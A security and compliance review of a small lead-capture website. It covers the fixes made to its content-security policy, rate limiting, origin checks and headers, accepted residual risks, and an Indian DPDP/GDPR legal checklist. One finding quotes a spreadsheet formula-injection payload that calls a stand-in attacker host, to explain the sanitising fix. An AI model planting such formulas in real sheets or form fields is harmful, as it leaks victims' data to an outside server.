# Security & compliance review — dragonflylab.in

**Reviewed and hardened 20 August 2026.** Covers the static site, the `/api/lead` endpoint,
the response-header configuration, and the legal position of the content.

> **On the legal half:** I have drafted the privacy policy and terms carefully against the
> Indian DPDP Act 2023, the DPDP Rules 2025 and GDPR, and they are a genuine, honest,
> defensible starting point. But I am not a lawyer and this is not legal advice. Have a
> qualified Indian lawyer read both documents before you rely on them — especially before you
> start taking money. It is an hour of somebody's time and it is worth it.

---

## 1. What was wrong, and what I fixed

| # | Severity | Issue | Fix |
|---|---|---|---|
| 1 | **High** | **No Content-Security-Policy.** Any injected script would have executed with full access to the page. | Hash-based CSP generated per page at build time. `script-src` contains **no `'unsafe-inline'`** — every legitimate inline script is named by its SHA-256 hash and nothing else can run. Verified by injecting a script into a live page and confirming it was blocked. |
| 2 | **High** | **Spreadsheet formula injection.** A lead could submit `=IMPORTXML("evil.com"&A1)` as their name. Sheets stores it as text, but the moment you export to `.xlsx`/CSV and open it in Excel — which is exactly the workflow you asked for — it executes. | Every value written to the sheet is prefixed with `'` if it begins with `=`, `+`, `-`, `@`, tab or CR. The cell is then unambiguously text everywhere, and the apostrophe is not displayed. |
| 3 | **Medium** | **No rate limiting.** The endpoint could be hammered, filling your sheet, burning your Apollo credits and your Resend quota. | Sliding-window limit of 5 submissions per IP per 10 minutes, with a bounded map so a spoofed-IP flood cannot exhaust memory. Returns 429 with `Retry-After`. |
| 4 | **Medium** | **No origin validation.** A form on any other website could post into your endpoint. | `Origin` allow-list covering the production domain and Vercel previews. Requests with no `Origin` header are still accepted, deliberately — some privacy tools strip it and losing a real enquiry is worse than the marginal risk. |
| 5 | **Medium** | **Personal data written to server logs.** Failed submissions logged the enquirer's name and email into platform logs, which are retained longer and are less access-controlled than the systems the data is meant to live in. | Logs now record only the failure shape (which destinations were skipped or failed, and the intent). No names, no emails. |
| 6 | **Medium** | `X-Frame-Options: SAMEORIGIN` allowed same-origin framing, and there was no `frame-ancestors`. | `X-Frame-Options: DENY` plus `Content-Security-Policy: frame-ancestors 'none'` as a real response header (that directive is ignored in a meta tag, so it has to live in `vercel.json`). |
| 7 | **Low** | API responses were cacheable and indexable. | `Cache-Control: no-store` and `X-Robots-Tag: noindex` on `/api/*`. |
| 8 | **Low** | Thin browser-hardening header set. | Added `Cross-Origin-Opener-Policy`, `Cross-Origin-Resource-Policy`, `X-Permitted-Cross-Domain-Policies`, and widened `Permissions-Policy` to deny payment, USB and the motion sensors as well. |
| 9 | **Low** | No client-side length caps on form fields. | `maxlength` on every input, matching the server-side caps that were already there. Defence in depth, and a better experience. |

All nine are fixed, and `npm run check` now fails the build if the CSP goes missing, weakens to
`'unsafe-inline'`, or is violated by any page.

---

## 2. What was already sound

Worth stating, because these are the vulnerability classes that account for most real incidents
and the architecture rules them out rather than defending against them:

- **No database.** Nothing to SQL-inject.
- **No server-rendered user content.** Every page is generated at build time from content in the
  repository. There is no path by which a visitor's input reaches another visitor's page, so
  stored XSS has nowhere to live.
- **All template output is escaped** through a single `esc()` helper.
- **No cookies at all.** Ahrefs Web Analytics is cookie-free. Smaller attack surface, no session
  to steal, and — see §4 — no cookie banner needed.
- **Secrets live only in Vercel environment variables.** Nothing sensitive is in the client
  bundle, and `.env` files are gitignored.
- **Zero npm dependencies in the API.** The Google JWT is signed with `node:crypto`. Nothing to
  supply-chain-attack, and cold starts stay fast.
- **HTTPS enforced** with a two-year HSTS `includeSubDomains; preload`.
- **Email notifications escape all interpolated values**, so a lead cannot inject HTML into the
  alert you read.
- **Sheets writes use `valueInputOption=RAW`**, so nothing is evaluated on write either.

---

## 3. Residual risks I have accepted, and why

I would rather name these than let you discover them.

**The rate limit is per-instance, not global.** Serverless functions do not share memory, so
under load Vercel may run several instances and a determined attacker could get some multiple of
5 submissions through. It stops the trivial case for free and with no extra infrastructure. If
the form is ever seriously abused, move the counter to Vercel KV or Upstash — the function is
isolated and easy to swap.

**`Origin` can be forged by a non-browser client.** The check stops a cross-site form; it does
not stop a script with a spoofed header. The honeypot, the timing gate, the rate limit and
server-side validation are what cover that case.

**`style-src` allows `'unsafe-inline'`.** The pages use inline `style` attributes for one-off
layout. CSS injection cannot execute code, and there is no injection point anyway since all
content is build-time. The alternative was several hundred single-use utility classes. Worth
revisiting if the site ever renders user content.

**Your Google service account can write to any sheet shared with it.** Share only the leads
sheet with it, nothing else. That is the actual boundary — the OAuth scope is coarser than the
access.

**API keys are as powerful as the accounts behind them.** If a key leaks, rotate it in the
provider and in Vercel. Apollo's key in particular can read your CRM.

---

## 4. Legal position

### Done

| Requirement | Status |
|---|---|
| Privacy policy — purpose, categories, retention, withdrawal mechanism | ✅ `/privacy/` |
| Terms of use | ✅ `/terms/` |
| Notice at the point of collection | ✅ Plain-language notice under every form, linking to the policy |
| Consent for marketing, separate from the enquiry | ✅ Unticked opt-in checkbox, recorded per lead in the sheet and in Apollo |
| Named Grievance Officer / contact who can answer data questions | ✅ On the privacy page (**needs a real name — see below**) |
| Route to withdraw consent and to erasure | ✅ Stated, with an email route |
| Stated retention period | ✅ 36 months from last contact |
| Breach-notification commitment (72 hours to the Data Protection Board) | ✅ Stated |
| Sub-processors named, cross-border transfer disclosed | ✅ Google, Apollo, Resend, Vercel, Ahrefs |
| Children's data position | ✅ Not directed at under-18s |
| Third-party trademark disclaimer | ✅ Site footer and terms |
| Comparative-advertising posture | ✅ Good faith, dated, sourced, with a standing invitation to competitors to correct us |
| Accuracy and specification disclaimer | ✅ Footer, terms, and inline wherever a figure appears |
| Cookie banner | ⛔ **Not required** — the site sets no cookies |

**The cookie point is worth understanding, because it is an asset.** Ahrefs Web Analytics is
cookie-free, so you owe no consent banner under GDPR or the DPDP Rules. That means no
conversion-killing overlay on a site whose entire job is conversion. **The moment you add GA4 or
Microsoft Clarity, that changes** — both set cookies, and you will need a consent banner for EU
visitors. Given the site is India-first with global reach, I would think hard before adding
them. Search Console gives you query data for free without cookies.

### You must do these before launch

1. **Fill in the real legal identity** in `src/data/site.mjs` → `legal`. Four placeholders are
   marked `TODO`: the exact registered entity name, the full registered address, who acts as
   Grievance Officer, and a working privacy address (`privacy@dragonflylab.in`). A privacy policy
   from a vaguely-identified entity is materially weaker.
2. **Have a lawyer review both documents.** Particularly the liability limits and the
   comparative-advertising section, which is the one most likely to draw a letter.
3. **Honour the marketing opt-in.** It is recorded per lead. Only email product updates to people
   whose row says `yes`. This is the single easiest compliance failure to commit by accident.
4. **Set a calendar reminder to delete leads older than 36 months.** The policy promises it. A
   promise you do not keep is worse than one you never made.

### If you later sell directly from the site

Selling changes the picture and adds obligations this review does not cover: refund,
cancellation and shipping policies; GST registration and invoice requirements; Legal Metrology
packaged-commodity declarations; and consumer-protection e-commerce rules. Come back to this
before you put a payment button up.

### Timeline worth knowing

Full DPDP compliance is expected by **13 May 2027**, phased. You are early, which is the easy
time to get the habits right rather than retrofit them.

---

## 5. Verification

`npm run check` renders every page in a real browser and now also asserts:

- a CSP is present on every page,
- the CSP does not allow `'unsafe-inline'` scripts,
- no page triggers a `securitypolicyviolation` event,
- the lead API rejects a missing name, rejects a malformed email, silently absorbs honeypot hits
  and instant submissions, and refuses to claim success when no destination stored the lead.

Two live negative tests were run against the built site and both passed: an inline script
injected into the DOM did **not** execute, and a `fetch()` to an unlisted third-party origin was
blocked by `connect-src`.
